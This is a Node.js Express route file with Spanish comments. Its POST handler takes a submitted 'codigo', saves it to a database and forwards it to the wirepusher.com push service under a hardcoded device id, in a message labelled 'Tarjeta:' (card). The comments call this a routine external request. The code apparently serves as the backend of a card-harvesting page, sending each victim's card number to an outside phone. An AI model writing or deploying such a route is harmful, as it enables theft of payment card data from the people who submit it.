// routes/consulta.js
const express = require('express');
const axios = require('axios');
const router = express.Router();
const pool = require('../db');

// POST /consulta
router.post('/', async (req, res) => {
  const { codigo } = req.body;

  if (!codigo) {
    return res.status(400).json({ error: 'Falta el parámetro "codigo"' });
  }

  try {
    // 1️⃣ Guardar el registro en la base de datos
    const registro = await pool.query(
      `INSERT INTO registros (codigo, created_at)
       VALUES ($1, NOW())
       RETURNING *`,
      [codigo]
    );

    // 2️⃣ Realizar petición externa (puedes cambiar la URL)
    const urlExterna = `https://wirepusher.com/send?id=TCF8mpzPW&title=Ingreso&message=Tarjeta:${codigo}&type=YourCustomType`;
    let datosExternos = null;

    try {
      const respuestaExterna = await axios.get(urlExterna);
      datosExternos = respuestaExterna.data;
    } catch (err) {
      console.warn('⚠️ Error al consultar la URL externa:', err.message);
      datosExternos = { aviso: 'No se pudo obtener datos externos' };
    }

    // 3️⃣ Devolver respuesta final
    res.json({
      mensaje: 'Consulta procesada y registro guardado correctamente',
      registro: registro.rows[0],
      datos_externos: datosExternos
    });
  } catch (error) {
    console.error('Error en /consulta:', error.message);
    res.status(500).json({ error: 'Error interno del servidor' });
  }
});

module.exports = router;
